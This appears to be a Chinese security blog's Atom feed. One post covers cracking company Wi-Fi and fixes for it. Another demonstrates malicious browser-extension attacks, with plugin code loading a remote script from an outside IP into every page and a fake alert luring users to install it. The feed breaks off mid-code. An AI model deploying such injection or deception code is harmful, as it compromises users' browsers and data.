<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Black-Hole&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bugs.cc/"/>
  <updated>2016-12-13T15:54:55.059Z</updated>
  <id>http://bugs.cc/</id>
  
  <author>
    <name>Black-Hole</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>公司wifi安全</title>
    <link href="http://bugs.cc/2016/12/13/%E5%85%AC%E5%8F%B8wifi%E5%AE%89%E5%85%A8/"/>
    <id>http://bugs.cc/2016/12/13/公司wifi安全/</id>
    <published>2016-12-13T03:00:48.000Z</published>
    <updated>2016-12-13T15:54:55.059Z</updated>
    
    <content type="html">&lt;h4 id=&quot;0x0-前言：&quot;&gt;&lt;a href=&quot;#0x0-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言：&quot;&gt;&lt;/a&gt;0x0 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;很多的公司都没有安全团队，只有运维来负责整个公司的安全，从而安全问题也大打折扣。我最近一直在给各个公司做安全检测，就把自己的心得写下来，有什么不足之处还望补充。&lt;/p&gt;
&lt;h4 id=&quot;0x1-无线安全：&quot;&gt;&lt;a href=&quot;#0x1-无线安全：&quot; class=&quot;headerlink&quot; title=&quot;0x1 无线安全：&quot;&gt;&lt;/a&gt;0x1 无线安全：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;很多的公司都有不怎么注重公司的无线电安全，有钱的公司买设备，没钱的公司搞人力。但是人的技术在好，没有设备的辅助，单纯的人力在厉害也没什么用。&lt;/p&gt;
&lt;p&gt;很多的公司WIFI认证基本都是WPA/WPA2然后加个WEB二次认证，认为这样就万无一失了，而其实这并没有什么用。破解WPA，可以使用aircrack-ng、airmon-ng、airodump-ng、aireplay-ng来实现破解，WPA2使用字典穷举。&lt;/p&gt;
&lt;p&gt;当然也可以使用大菠萝伪造一个WIFI。而大家也都知道有一款神器叫做“wifi万能钥匙”，可以先去看看wifi万能钥匙能不能解，不能解的话再破。连上WIFI后，将会提示你需要进行WEB二次认证。这里你完全可以弃之不理，因为它并没有什么用。&lt;/p&gt;
&lt;p&gt;因为你是WPA/WPA2的认证方式，你连上WIFI之后，交换机就会马上分配给你一个内网IP（我遇到的是交换机，也可能是路由器）一个黑客要你外网干什么，他需要的是公司的内网资源。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;连不上网对黑客来说没有什么问题。我给某公司做安全检测的时候，万能钥匙破解—中间人嗅探。不到两分钟拿到了他们公司官网后台管理员的权限。&lt;/p&gt;
&lt;p&gt;WEB认证在我看来不是针对于黑客的，是针对于员工的，因为黑客不需要外网资源，但是员工需要。&lt;br&gt;下面是我画的图：&lt;br&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/company-wifi-security/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.processon.com/view/556d3cd0e4b09c41cc41b26e&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;思维导图URL&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;黑客连入WIFI后，虽然WEB二次认证不了，但是黑客现在已经处于内网中，他可以访问内网的任何资源。&lt;/p&gt;
&lt;p&gt;修复建议：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;把WPA/WPA2无线认证换成802.1x认证方式（802.1x无线认证方式需要交换机的支持）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;买针对无线检测/防御设备&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;无线不能访问内网资源，只有有线可以访问内网资源（从物理上隔绝问题）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;关于802.1x认证方式，他的原理图是下面这样的:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/company-wifi-security/2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.processon.com/view/link/556d5c6be4b09c41cc43c0e3&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;思维导图URL&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;黑客即使连上公司WIFI，但是无法通过802.1x认证，导致&lt;/p&gt;
&lt;p&gt;公司设备（路由器、交换机）无法分配给你内网IP和外网出口IP的资格。   &lt;/p&gt;
&lt;h4 id=&quot;0x2-较为深入无线安全：&quot;&gt;&lt;a href=&quot;#0x2-较为深入无线安全：&quot; class=&quot;headerlink&quot; title=&quot;0x2 较为深入无线安全：&quot;&gt;&lt;/a&gt;0x2 较为深入无线安全：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;像上面所讲，只是针对公司开放的WIFI进行管理。&lt;/p&gt;
&lt;p&gt;而上面的三个解决方案，只有第一个相比之下是比较方便还不用花钱的（机房设备需要支持802.1x无线协议，不支持还是要花钱）。&lt;/p&gt;
&lt;p&gt;第二个，公司如果不想花钱是不会选择的，而且买了还要配置，前期工作量特别大。&lt;/p&gt;
&lt;p&gt;第三个，工作量大，需要重新架构公司网络，我和一个同事在下午6点下班后一直忙到第二天上班之前才搞定。&lt;/p&gt;
&lt;p&gt;如果公司不想花钱或者运维不想重新架构的话，第一种是很好的选择，但是这里又有一个问题，360/百度随身WIFI，这个东西的存在，对那些本来就不怎么安全的公司更是雪上加霜。&lt;/p&gt;
&lt;p&gt;360/百度随身WIFI插入公司电脑后，会开启ICS服务，加上自带的无线网卡AP功能。当你连上这个随身WIFI之后，相当于一个小型的局域网。这时我们可以先入侵那个插了随身WIFI的PC电脑，通过它来入侵整个公司。如果你只需要某个接口，则不需要入侵插了随身WIFI的PC电脑。这里假设下“我需要的是这个网站的后台，可是想要登陆这个网站后台，需要出口IP是这个公司的外网IP”这样的话，我们则不需要入侵插了随身WIFI的PC电脑来。为什么呢？我画了一个图，大家看下:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/company-wifi-security/3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.processon.com/view/556d175ee4b0546a904aa2bb&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;思维导图URL&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;黑客连入WIFI后，无需进行WEB二次认证，因为它使用的是员工的网络，员工也肯定认证过了，员工使用的是公司内网，内网有个统一的出口IP，而服务器端也只认这个IP，其他IP连不上服务器。&lt;/p&gt;
&lt;p&gt;解决办法，网上很多，可以参考网上的教程。&lt;/p&gt;
&lt;p&gt;如果你又更好的解决方案，可以提出来。我个人的思路有限。有不足之处，还望见谅。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x0-前言：&quot;&gt;&lt;a href=&quot;#0x0-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言：&quot;&gt;&lt;/a&gt;0x0 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;很多的公司都没有安全团队，只有运维来负责整个公司的安全，从而安全问题也大打折扣。我最近一直在给各个公司做安全检测，就把自己的心得写下来，有什么不足之处还望补充。&lt;/p&gt;
&lt;h4 id=&quot;0x1-无线安全：&quot;&gt;&lt;a href=&quot;#0x1-无线安全：&quot; class=&quot;headerlink&quot; title=&quot;0x1 无线安全：&quot;&gt;&lt;/a&gt;0x1 无线安全：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;很多的公司都有不怎么注重公司的无线电安全，有钱的公司买设备，没钱的公司搞人力。但是人的技术在好，没有设备的辅助，单纯的人力在厉害也没什么用。&lt;/p&gt;
&lt;p&gt;很多的公司WIFI认证基本都是WPA/WPA2然后加个WEB二次认证，认为这样就万无一失了，而其实这并没有什么用。破解WPA，可以使用aircrack-ng、airmon-ng、airodump-ng、aireplay-ng来实现破解，WPA2使用字典穷举。&lt;/p&gt;
&lt;p&gt;当然也可以使用大菠萝伪造一个WIFI。而大家也都知道有一款神器叫做“wifi万能钥匙”，可以先去看看wifi万能钥匙能不能解，不能解的话再破。连上WIFI后，将会提示你需要进行WEB二次认证。这里你完全可以弃之不理，因为它并没有什么用。&lt;/p&gt;
&lt;p&gt;因为你是WPA/WPA2的认证方式，你连上WIFI之后，交换机就会马上分配给你一个内网IP（我遇到的是交换机，也可能是路由器）一个黑客要你外网干什么，他需要的是公司的内网资源。&lt;br&gt;
    
    </summary>
    
    
      <category term="无线安全" scheme="http://bugs.cc/tags/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>浏览器插件的攻击向量</title>
    <link href="http://bugs.cc/2016/10/05/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F/"/>
    <id>http://bugs.cc/2016/10/05/浏览器插件的攻击向量/</id>
    <published>2016-10-05T12:35:52.000Z</published>
    <updated>2016-10-31T09:26:48.103Z</updated>
    
    <content type="html">&lt;h4 id=&quot;0x0-前言：&quot;&gt;&lt;a href=&quot;#0x0-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言：&quot;&gt;&lt;/a&gt;0x0 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。&lt;/p&gt;
&lt;h4 id=&quot;0x1-让自己变成攻击者：&quot;&gt;&lt;a href=&quot;#0x1-让自己变成攻击者：&quot; class=&quot;headerlink&quot; title=&quot;0x1 让自己变成攻击者：&quot;&gt;&lt;/a&gt;0x1 让自己变成攻击者：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chrome有过类似的攻击手法，但是攻击代码所做的事比较少，于是本篇我们先成为攻击者，站在攻击者的角度来研究这个攻击手法。之前我在介绍这个攻击手法的时候都是在文章里开一个小节来说的。现在我专门来为这个攻击方法写篇文章，也希望让大家重视起来。&lt;/p&gt;
&lt;p&gt;在大家的理解里，浏览器插件攻击就是在插件里植入javascript代码，做一些盗取cookies的事情，但是事情远没有那么简单。&lt;/p&gt;
&lt;p&gt;大家都知道进行“浏览器插件攻击”就需要用户安装了你的插件。大家也都认为只有这一种方法，但是事实并非如此，下面是4种安装插件的方法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”&lt;/p&gt;
&lt;p&gt;被动等待，类似：姜太公钓鱼愿者上钩的感觉，插件就在那，你不安装总会有人安装&lt;/p&gt;
&lt;p&gt;基于社工库控制插件作者的账户，加入后门代码，更新插件&lt;/p&gt;
&lt;p&gt;控制插件里调用的第三方javascript代码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;现在有四种方法供我们选择，我们一个个来进行介绍。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h5 id=&quot;0x1-1-在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”&quot;&gt;&lt;a href=&quot;#0x1-1-在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”&quot; class=&quot;headerlink&quot; title=&quot;0x1.1 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”&quot;&gt;&lt;/a&gt;0x1.1 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”&lt;/h5&gt;&lt;p&gt;这个方法类似于之前的问题&lt;a href=&quot;http://www.cnbeta.com/articles/470593.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;强迫安装恶意Chrome扩展 攻击者使用激进方式&lt;/a&gt;。这里我们也来实现一下并且优化下，此处使用的案例是“MaxThon遨游浏览器插件”。&lt;/p&gt;
&lt;h6 id=&quot;0x1-1-1-检测是否安装了某插件&quot;&gt;&lt;a href=&quot;#0x1-1-1-检测是否安装了某插件&quot; class=&quot;headerlink&quot; title=&quot;0x1.1.1 检测是否安装了某插件&quot;&gt;&lt;/a&gt;0x1.1.1 检测是否安装了某插件&lt;/h6&gt;&lt;p&gt;我们先把这个攻击方式的代码目录架构进行说明：&lt;/p&gt;
&lt;p&gt;网站页面:&lt;code&gt;index.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;插件目录:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;icons/              插件的logo存放目录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;icons/icons.svg     插件logo文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def.json            插件的主控制文件，里面存着整个插件的配置&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;代码如下:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;quot;type&amp;quot;: &amp;quot;extension&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;quot;frameworkVersion&amp;quot;:&amp;quot;1.0.0&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;quot;version&amp;quot;:&amp;quot;1.0.0&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;quot;guid&amp;quot;: &amp;quot;&amp;#123;7c321680-7673-484c-bcc4-de10f453cb8e&amp;#125;&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;quot;name&amp;quot;: &amp;quot;plug_setup&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;quot;author&amp;quot;: &amp;quot;Black-Hole&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;quot;svg_icon&amp;quot;:&amp;quot;icon.svg&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;quot;title&amp;quot;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;quot;zh-cn&amp;quot;: &amp;quot;欺骗用户安装插件&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;quot;description&amp;quot;:&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;quot;zh-cn&amp;quot;:&amp;quot;欺骗用户安装插件&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;quot;main&amp;quot;:&amp;quot;index.html&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;quot;actions&amp;quot;: [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;quot;type&amp;quot;: &amp;quot;script&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;quot;entryPoints&amp;quot;: [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;quot;doc_onload&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;quot;js&amp;quot;: [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;quot;base.js&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;quot;include&amp;quot;: [&amp;quot;*&amp;quot;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;quot;includeFrames&amp;quot;: true&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;base.js             每打开一个页面，要执行的JavaScript代码&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;代码如下:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;后文会提到&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;我翻遍了整个遨游插件的API手册，没有找到类似chrome Plug API的：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;chrome.runtime.onMessage.addListener(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;request, sender, sendResponse&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(request.act == &lt;span class=&quot;string&quot;&gt;&#39;ping&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sendResponse(&amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;act&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;tong&quot;&lt;/span&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;chrome.runtime.sendMessage(&lt;span class=&quot;string&quot;&gt;&quot;extensionId&quot;&lt;/span&gt;, &amp;#123;&lt;span class=&quot;string&quot;&gt;&quot;act&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;ping&quot;&lt;/span&gt;&amp;#125;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;response&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(response &amp;amp;&amp;amp; response.act == &lt;span class=&quot;string&quot;&gt;&#39;tong&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;&#39;已安装&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;&#39;未安装&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;既然没有找到，我们就要想其他比较Hack的办法来解决这个问题。&lt;/p&gt;
&lt;p&gt;这里我使用的办法是利用JavaScript全局及setTimeout函数来解决这个问题。&lt;/p&gt;
&lt;p&gt;首先在插件里的base.js文件里写入:&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; script = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.createElement(&lt;span class=&quot;string&quot;&gt;&#39;script&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;script.src = &lt;span class=&quot;string&quot;&gt;&quot;http://119.29.58.242/control.js&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.body.appendChild(script);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面，这段代码将会在每个页面里的body标签后面写入&lt;code&gt;&amp;lt;script src=&amp;quot;http://119.29.58.242/control.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;代码，而在&lt;code&gt;http://119.29.58.242/control.js&lt;/code&gt;文件里的代码为:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;window.plug_setup = function()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这时，用户打开任何一个网页，那个网页的全局函数中就会有一个名为plug_setup的函数，并且不具有任何作用，很容易让人忽略掉，只会在特殊的页面中才会起作用。&lt;/p&gt;
&lt;p&gt;然后我们再在网站的页面里写：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;setTimeout(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt;(plug_setup)!=&lt;span class=&quot;string&quot;&gt;&quot;function&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        alret(&lt;span class=&quot;string&quot;&gt;&quot;因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span 